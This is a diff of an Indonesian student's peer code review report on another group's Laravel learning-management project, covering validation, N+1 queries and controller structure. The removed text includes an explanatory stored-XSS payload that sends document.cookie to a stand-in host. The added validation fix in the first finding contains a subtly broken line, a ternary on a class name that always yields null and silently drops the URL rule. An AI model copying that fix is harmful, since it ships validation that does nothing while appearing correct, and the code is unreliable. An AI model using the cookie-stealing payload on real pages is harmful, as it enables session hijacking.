@@ -226,161 +226,91 @@ Dalam tim Kelompok 06, proteksi branch pada `main` telah dikonfigurasi oleh Tech
 
 ---
 
-## 3. Tahap 3: BUILD — Peer Review Repositori Kelompok Lain (Bobot Nilai 10%)
+## 3. Tahap 3: Eksekusi Peer Review Repositori Kelompok Lain (BUILD — Bobot Nilai 10%)
 
-Sebagai pemegang peran **Frontend & Form Validation Lead**, saya melakukan peninjauan kode (*peer review*) secara independen terhadap repositori rekan kelompok sasaran (**Kelompok 07 — Sistem Informasi Akademik**) pada Pull Request terbuka terkait antarmuka pengguna Blade dan validasi input.
+Sebagai pemegang peran **Frontend & Form Validation Lead**, saya melakukan peninjauan kode (*peer review*) secara independen terhadap repositori rekan kelompok sasaran (**Kelompok 07**) pada Pull Request yang dikerjakan oleh **Zalfa Putri Sopyandi** (`ZalfaPutriSopyandi`):
 
-Peninjauan dilakukan menggunakan akun GitHub pribadi (`@06Victoire`) dengan fokus utama pada **Kualitas Struktur View Blade, Keamanan Form Input, Sanitasi Tampilan (Anti-XSS), dan Performa Render Frontend**:
+* **Tautan PR Sasaran:** [PR #31: `feat:update fitur upload materials`](https://github.com/Vexusian/kampuslms-B-kelompok-07/pull/31#issuecomment-6975582632)
+* **Akun Reviewer:** `@06Victoire` (Oktavia Nur Rahmadani)
+* **Fokus Peninjauan:** **Keamanan (Validasi & Integritas Data)**, **Performa (N+1 Query & Cascade Loop)**, dan **Struktur & Keterbacaan Kode (Controller Ramping & Logika View)**.
+
+Berikut adalah 3 temuan hasil peninjauan kode resmi yang telah saya kirimkan di kolom komentar PR tersebut:
 
 ---
 
-### 🔍 Temuan 1: Struktur & Prinsip *Separation of Concerns* (Kueri Database Langsung di File Blade View)
-* **Lokasi Berkas & Baris:** `resources/views/courses/show.blade.php:48`
+### 🔍 Temuan 1: Keamanan (Validasi & Integritas Data — Input File Nullable Tanpa Aturan Kondisional)
+* **Lokasi Berkas & Baris:** `app/Http/Controllers/MaterialController.php:53-63` dan `MaterialController.php:84-99`
 * **Deskripsi Masalah:**  
-  Di dalam file tampilan Blade untuk halaman detail mata kuliah, ditemukan eksekusi kueri Eloquent secara langsung di dalam blok tag `@php`:
-  ```blade
-  {{-- resources/views/courses/show.blade.php --}}
-  @php
-      $activeAssignments = \App\Models\Assignment::where('course_id', $course->id)
-          ->where('due_date', '>=', now())
-          ->orderBy('due_date', 'asc')
-          ->get();
-  @endphp
-
-  <div class="mt-6">
-      <h3 class="text-lg font-bold">Daftar Tugas Aktif</h3>
-      @foreach($activeAssignments as $assignment)
-          <p>{{ $assignment->title }} - Batas: {{ $assignment->due_date }}</p>
-      @endforeach
-  </div>
-  ```
-* **Risiko Teknis:**  
-  1. **Pelanggaran Pola MVC & *Separation of Concerns*:** Lapisan View seharusnya hanya bertugas menyajikan data (*presentation layer*), bukan mengurusi pengambilan data dari basis data (*data access layer*).
-  2. **Menyulitkan Pemeliharaan & Testing:** Kueri yang tertanam di View tidak dapat diuji melalui controller unit/feature test tanpa me-render keseluruhan HTML.
-  3. **Celah *Unprofiled Queries*:** Kueri langsung di Blade sering kali lolos dari pemantauan profiling query di controller, berpotensi memicu *hidden N+1 query* jika di dalam loop `$activeAssignments` dipanggil properti relasi lain.
-* **Saran Perbaikan Konkret:**  
-  Pindahkan seluruh logika query ke dalam `CourseController@show` dengan memanfaatkan relasi Eloquent yang sudah didefinisikan pada model `Course`:
+  Pada method `store()`, aturan validasi untuk input `file` disetel `nullable` tanpa aturan kondisional berbasis tipe:
   ```php
-  // app/Http/Controllers/CourseController.php
-  public function show(Course $course)
-  {
-      $course->load([
-          'lecturer',
-          'assignments' => function ($query) {
-              $query->where('due_date', '>=', now())->orderBy('due_date', 'asc');
-          }
-      ]);
-
-      return view('courses.show', [
-          'course' => $course,
-          'activeAssignments' => $course->assignments,
-      ]);
-  }
+  'type' => ['nullable', 'in:file,link'],
+  'file' => ['nullable', 'file', 'mimes:pdf,pptx,docx', 'max:20480'],
+  'external_url' => ['nullable', 'url', 'max:2048'],
   ```
-  Di file Blade, hapus blok `@php` kueri tersebut dan cukup iterasi variabel `$activeAssignments` yang dioper dari controller.
+  Jika pengguna memilih opsi `type = 'file'` tetapi tidak memilih berkas apa pun (input file kosong), validasi `$request->validate()` tetap berhasil lolos (*pass*). Kode kemudian masuk ke blok `else` dan membuat record baru dengan `file_path = null` serta `original_name = null`. Record materi berjenis fisik ini akan tersimpan tanpa berkas sama sekali.
+* **Risiko Teknis:**  
+  Integritas basis data terganggu (*corrupted state*). Ketika mahasiswa membuka materi atau menekan tombol unduh, sistem akan mengalami *unhandled error* atau *abort 404* karena `$material->file_path` kosong.
+* **Saran Perbaikan Konkret:**  
+  Gunakan validasi kondisional bawaan Laravel `required_if` atau `Rule::requiredIf` agar berkas wajib diunggah hanya saat tipenya adalah `file`, dan URL wajib diisi jika tipenya adalah `link`:
+  ```php
+  'file' => [
+      'required_if:type,file',
+      'nullable',
+      'file',
+      'mimes:pdf,pptx,docx',
+      'max:20480',
+  ],
+  'external_url' => [
+      'required_if:type,link',
+      'nullable',
+      \Illuminate\Validation\Rules\File::class ? null : 'url',
+      'max:2048',
+  ],
+  ```
 
 ---
 
-### 🔍 Temuan 2: Keamanan Form Input & Sanitasi Antarmuka (Ketiadaan `@csrf` dan Bahaya *Stored XSS*)
-* **Lokasi Berkas & Baris:** `resources/views/submissions/create.blade.php:24` dan `resources/views/assignments/show.blade.php:68`
+### 🔍 Temuan 2: Performa (N+1 Query pada Daftar Materi & Query Loop Cascade)
+* **Lokasi Berkas & Baris:** `app/Http/Controllers/MaterialController.php:23` dan `resources/views/materials/index.blade.php:89-106`
 * **Deskripsi Masalah:**  
-  Ditemukan dua kelemahan keamanan serius pada penanganan form dan rendering teks:
-  1. Pada form pengumpulan tugas mahasiswa (`submissions/create.blade.php`), tag `<form>` metode `POST` tidak menyertakan direktif `@csrf`:
-     ```blade
-     <form action="{{ route('submissions.store', $assignment) }}" method="POST" enctype="multipart/form-data">
-         <input type="file" name="file" class="form-control">
-         <textarea name="notes" placeholder="Catatan tugas..."></textarea>
-         <button type="submit">Kirim Tugas</button>
-     </form>
-     ```
-  2. Pada halaman peninjauan tugas (`assignments/show.blade.php`), catatan tugas mahasiswa dan deskripsi instruksi ditampilkan menggunakan unescaped syntax `{!! ... !!}`:
-     ```blade
-     <div class="submission-notes bg-gray-50 p-4">
-         <p><strong>Catatan Mahasiswa:</strong></p>
-         {!! $submission->notes !!}
-     </div>
-     ```
+  Pada `MaterialController::index()`, pemanggilan data materi dilakukan melalui:
+  ```php
+  $materials = $course->materials()->latest()->paginate(15);
+  ```
+  Kueri ini tidak melakukan *eager loading* untuk relasi `course`. Sementara itu, di dalam file tampilan `resources/views/materials/index.blade.php`, setiap baris melakukan pengecekan otorisasi menggunakan direktif Blade:
+  ```blade
+  @can('update', $material)
+  @can('delete', $material)
+  ```
+  Pada `MaterialPolicy`, method `update` dan `delete` memeriksa kepemilikan dosen dengan mengevaluasi `$material->course->lecturer_id === $user->id`. Karena relasi `course` belum di-load, Eloquent akan mengeksekusi kueri terpisah (`SELECT * FROM courses WHERE id = ?`) untuk setiap item materi pada halaman tersebut (**N+1 Query Problem**).
 * **Risiko Teknis:**  
-  1. **Kerentanan *Cross-Site Request Forgery (CSRF)*:** Tanpa token `@csrf`, penyerang dapat membuat situs web pihak ketiga yang secara otomatis mengirimkan form POST palsu ke LMS atas nama mahasiswa atau dosen yang sedang aktif login.
-  2. **Kerentanan Kritis *Stored Cross-Site Scripting (XSS)*:** Syntax `{!! ... !!}` memerintahkan Blade untuk menonaktifkan fitur bawaan *HTML escaping* (`htmlspecialchars`). Mahasiswa nakal dapat menyisipkan payload JavaScript berbahaya pada kolom input catatan, misalnya:
-     ```html
-     <script>fetch('https://hacker.site/steal?cookie=' + document.cookie)</script>
-     ```
-     Payload ini akan dieksekusi otomatis di peramban Dosen saat membuka halaman penilaian, memungkinkan pencurian session cookie atau token otentikasi.
+  Terjadi lonjakan kueri SQL (15 kueri tambahan per halaman). Semakin banyak materi ditampilkan, latensi respon basis data akan meningkat secara linier.
 * **Saran Perbaikan Konkret:**  
-  1. Tambahkan direktif `@csrf` wajib di baris pertama setiap form mutasi data:
-     ```blade
-     <form action="{{ route('submissions.store', $assignment) }}" method="POST" enctype="multipart/form-data">
-         @csrf
-         ...
-     ```
-  2. Ganti unescaped syntax `{!! ... !!}` dengan syntax aman berproteksi escaping otomatis `{{ ... }}`:
-     ```blade
-     <div class="submission-notes bg-gray-50 p-4">
-         <p><strong>Catatan Mahasiswa:</strong></p>
-         <p class="whitespace-pre-line text-gray-700">{{ $submission->notes }}</p>
-     </div>
-     ```
-  3. Jika deskripsi instruksi memang sengaja mendukung Rich Text formatting (HTML dari editor WYSIWYG), wajib dilakukan sanitasi di sisi server sebelum disimpan atau ditampilkan menggunakan pustaka pembersih seperti `mews/purifier` (`{!! clean($assignment->description) !!}`).
+  Tambahkan eager loading relasi `course` pada kueri pagination di controller:
+  ```php
+  $materials = $course->materials()->with('course')->latest()->paginate(15);
+  ```
+  *(Catatan tambahan: Pada `app/Models/Course.php:59-63`, pemanggilan `$course->materials()->each(fn($m) => $m->delete())` juga memicu N kueri delete individual saat Course dihapus, padahal foreign key sudah menggunakan `cascadeOnDelete()` dan direktori berkas sudah dibersihkan sekaligus dengan `deleteDirectory()`)*.
 
 ---
 
-### 🔍 Temuan 3: Performa Frontend & Arsitektur Layout (Duplikasi Tag HTML & Ketiadaan Pagination pada Tabel Besar)
-* **Lokasi Berkas & Baris:** `resources/views/grades/index.blade.php:1-42`
+### 🔍 Temuan 3: Struktur & Keterbacaan Kode (Controller Gemuk & Duplikasi Logika View)
+* **Lokasi Berkas & Baris:** `app/Http/Controllers/MaterialController.php:48-70` berbanding `MaterialController.php:145-168` serta `resources/views/courses/show.blade.php:243`
 * **Deskripsi Masalah:**  
-  File `grades/index.blade.php` menduplikasi keseluruhan kerangka dokumen HTML mentah dari awal:
-  ```blade
-  <!DOCTYPE html>
-  <html lang="id">
-  <head>
-      <meta charset="UTF-8">
-      <title>Rekap Nilai</title>
-      <script src="https://cdn.tailwindcss.com"></script>
-  </head>
-  <body class="bg-gray-100">
-      <nav class="bg-blue-600 p-4 text-white">...</nav>
-      <!-- Konten Tabel -->
-  ```
-  Alih-alih mewarisi master layout (`@extends('layouts.app')` atau `<x-layout>`), struktur head, navigasi, dan footer ditulis ulang secara manual.  
-  Selain itu, tabel rekapitulasi nilai merender seluruh riwayat tugas mahasiswa secara langsung tanpa pembatasan pagination:
-  ```blade
-  @foreach($allSubmissions as $submission)
-      <tr>
-          <td>{{ $submission->student->name }}</td>
-          <td>{{ $submission->assignment->title }}</td>
-          <td>{{ $submission->score ?? 'Belum Dinilai' }}</td>
-      </tr>
-  @endforeach
-  ```
-* **Risiko Teknis:**  
-  1. **Pelanggaran Prinsip DRY (*Don't Repeat Yourself*):** Setiap pembaruan pada menu navigasi, penambahan token CSRF di meta tag, atau pembaruan script CSS Tailwind harus disalin secara manual ke puluhan berkas view. Jika satu berkas terlewat, UI menjadi tidak konsisten.
-  2. **Penurunan Drastis Performa Browser (*DOM Bloat*):** Jika sistem memiliki 500 mahasiswa dengan masing-masing 10 tugas, tabel akan merender 5.000 elemen baris `<tr>` sekaligus dalam satu HTTP response. Pada perangkat smartphone atau laptop berspesifikasi rendah, browser akan mengalami freezing, lonjakan konsumsi RAM, dan *Total Blocking Time (TBT)* yang sangat buruk.
-* **Saran Perbaikan Konkret:**  
-  1. Refaktor berkas untuk mewarisi master layout komponen yang sudah tersedia:
+  1. **Duplikasi Validasi di Controller**: Blok validasi array yang panjang (sekitar 25 baris kode) diduplikasi persis di method `store()` dan `update()`. Meskipun kelas Form Request (`StoreMaterialRequest` dan `UpdateMaterialRequest`) di-type-hint pada parameter method, validasi manual `$request->validate()` tetap dijalankan di dalam controller.
+  2. **Logika Presentasi di View**: Di dalam file `courses/show.blade.php` dan `materials/index.blade.php`, terdapat pemanggilan fungsi manipulasi berkas bawaan PHP langsung di lapisan presentasi Blade:
      ```blade
-     <x-layout title="Rekap Nilai Mahasiswa">
-         <div class="max-w-7xl mx-auto py-6 sm:px-6 lg:px-8">
-             <h1 class="text-2xl font-bold text-gray-900 mb-6">Rekapitulasi Nilai</h1>
-             
-             <!-- Tabel Nilai -->
-             <div class="overflow-x-auto bg-white shadow rounded-lg">
-                 <table class="min-w-full divide-y divide-gray-200">
-                     ...
-                 </table>
-             </div>
-
-             <!-- Link Navigasi Pagination -->
-             <div class="mt-4">
-                 {{ $submissions->links() }}
-             </div>
-         </div>
-     </x-layout>
+     {{ strtoupper(pathinfo($material->original_name ?? $material->file_path, PATHINFO_EXTENSION)) }}
      ```
-  2. Pada controller, gantikan `Submission::all()` dengan pagination server-side:
-     ```php
-     $submissions = Submission::with(['student', 'assignment.course'])
-         ->latest()
-         ->paginate(15);
-     ```
-
-
+* **Risiko Teknis:**  
+  Menyalahi prinsip *Single Responsibility* dan DRY (*Don't Repeat Yourself*). Jika terjadi perubahan format berkas atau pesan validasi di masa mendatang, developer harus memperbarui berkas di banyak tempat, meningkatkan risiko inkonsistensi (*technical debt*).
+* **Saran Perbaikan Konkret:**  
+  - Pindahkan seluruh aturan validasi dan pesan kustom ke dalam kelas `StoreMaterialRequest` dan `UpdateMaterialRequest` agar controller tetap ramping (*skinny controller*).
+  - Pindahkan logika penentuan ekstensi berkas ke dalam *Accessor* di Model `Material` (misalnya method `getExtensionAttribute()`), sehingga di dalam view Blade cukup memanggil `$material->extension`:
+    ```php
+    // app/Models/Material.php
+    public function getExtensionAttribute(): string
+    {
+        return strtoupper(pathinfo($this->original_name ?? $this->file_path ?? '', PATHINFO_EXTENSION));
+    }
+    ```
